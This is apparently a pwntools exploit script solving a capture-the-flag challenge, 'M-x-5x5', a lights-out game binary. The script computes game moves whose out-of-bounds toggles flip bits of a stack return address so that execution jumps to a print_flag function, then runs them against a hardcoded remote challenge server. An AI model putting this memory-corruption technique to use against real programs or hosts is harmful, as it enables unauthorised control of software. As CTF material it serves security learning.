from pwn import *

exe = ELF("M-x-5x5")
context(binary=exe, log_level="debug")


REMOTE = 1


def toggle_light(lights, move):
	dy = [-1, 0, 0, 0, 1]
	dx = [0, -1, 0, 1, 0]
	
	# After y=14, the binary stops doing the bottom part of the plus,
	# so only toggle the first 4 lights
	for i in range(4):
		x = move[0] + dx[i]
		y = move[1] + dy[i]
		
		if x < 0 or y < 0:
			continue
		
		try:
			lights[y][x] ^= 1
		except IndexError:
			pass

def change_lights(offset, size, src, dst):
	moves = []
	
	toggle = list(map(ord, p64(src ^ dst)))
	lights = [[(b >> x) & 1 for x in range(8)] for b in toggle]
	
	for y in range(size):
		while 1 in lights[y]:
			x = lights[y].index(1)
			moves.append((x, offset + y+1))
			toggle_light(lights, (x, y+1))
	
	return moves

def send_move(r, move):
	r.recvuntil("[f <x> <y>/h/q]: ")
	info("f %d %d" % move)
	r.sendline("f %d %d" % move)

def main():
	if REMOTE:
		r = remote("13.53.187.163", 50000)
	else:
		r = exe.process()
		gdb.attach(r, "c")
# 		gdb.attach(r, """
# pset option clearscr off
# pset option context ''

# b *0x400acb

# b *0x400AC5
# commands 2
# telescope $rbp+8 1
# call (void)show_board($rbp+8, 8)
# end

# c""")
	
	src = 0x400b6f
	dst = 0x400738
	
	assert dst == exe.symbols["print_flag"] + 1
	
	moves = change_lights(16, 8, src, dst)
	
	r.recvuntil("Press enter to run M-x 5x5\n")
	r.sendline("")
	
	r.recvuntil("Board size (1 to 8)? ")
	r.sendline("8")
	
	for move in moves:
		send_move(r, move)
	
	r.recvuntil("[f <x> <y>/h/q]: ")
	r.sendline("q")
	
	r.interactive("")

if __name__ == "__main__":
	main()
